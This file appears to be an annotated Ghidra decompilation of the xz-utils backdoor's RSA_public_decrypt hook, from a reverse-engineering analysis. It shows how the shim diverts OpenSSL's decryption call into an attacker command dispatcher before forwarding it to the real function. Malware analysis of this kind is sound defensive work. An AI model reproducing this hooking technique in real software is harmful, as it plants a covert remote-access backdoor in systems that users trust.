// /home/kali/xzre-ghidra/xzregh/10A240_rsa_public_decrypt_backdoor_shim.c
// Function: rsa_public_decrypt_backdoor_shim @ 0x10A240
// Calling convention: __stdcall
// Prototype: int __stdcall rsa_public_decrypt_backdoor_shim(int flen, uchar * from, uchar * to, RSA * rsa, int padding)


/*
 * AutoDoc: Drop-in replacement for RSA_public_decrypt. The shim validates that the loader captured the original PLT target, seeds a stack do_orig flag, and calls rsa_backdoor_command_dispatch so attacker payloads can consume the ciphertext. If the dispatcher clears the flag the hook returns its BOOL result directly; otherwise it tail-calls the preserved RSA_public_decrypt pointer so OpenSSL decrypts the buffer as normal.
 */

#include "xzre_types.h"

int rsa_public_decrypt_backdoor_shim(int flen,uchar *from,uchar *to,RSA *rsa,int padding)

{
  pfn_RSA_public_decrypt_t orig_RSA_public_decrypt;
  BOOL backdoor_result;
  int openssl_status;
  pfn_RSA_public_decrypt_t rsa_public_decrypt_stub;
  BOOL unused_call_orig_stub;
  BOOL do_orig_flag;
  
  if (((global_ctx != (global_context_t *)0x0) &&
      (global_ctx->imported_funcs != (imported_funcs_t *)0x0)) &&
     // AutoDoc: Bail unless the loader resolved the genuine RSA_public_decrypt pointer; without it we cannot forward the call.
     (orig_RSA_public_decrypt = global_ctx->imported_funcs->RSA_public_decrypt_orig,
     orig_RSA_public_decrypt != (pfn_RSA_public_decrypt_t)0x0)) {
    if (rsa != (RSA *)0x0) {
      do_orig_flag = TRUE;
      // AutoDoc: Treat the stack BOOL as the do_orig flag rsa_backdoor_command_dispatch mutates; returning FALSE here means the dispatcher already handled the ciphertext.
      backdoor_result = rsa_backdoor_command_dispatch(rsa,global_ctx,&do_orig_flag);
      if (do_orig_flag == FALSE) {
        return backdoor_result;
      }
    }
                    /* Hook tail-call: once the dispatcher forwards to OpenSSL it jumps via orig_RSA_public_decrypt, not through a jumptable. */
    // AutoDoc: When the dispatcher leaves do_orig TRUE we tail-call directly into OpenSSL's implementation.
    openssl_status = (*orig_RSA_public_decrypt)(flen,from,to,rsa,padding);
    return openssl_status;
  }
  return 0;
}

